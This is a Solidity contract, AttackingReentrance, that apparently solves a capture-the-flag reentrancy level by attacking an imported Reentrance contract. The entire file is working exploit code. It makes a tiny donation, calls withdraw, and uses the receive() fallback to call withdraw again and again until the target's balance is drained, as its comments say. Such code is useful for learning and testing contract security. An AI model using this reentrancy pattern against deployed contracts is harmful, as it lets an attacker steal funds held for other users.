// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance public reentrance;
    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        //Sending balance to Reentrance contract to be able to call withdraw
        reentrance = Reentrance(contractAddress);
        reentrance.donate{ value : 1 }(address(this));
        reentrance.withdraw();
    }

    receive() external payable {
        //If the contract has balance we call withdraw function again to drain all funds
        if (contractAddress.balance > 0)
        reentrance.withdraw();
    }
}
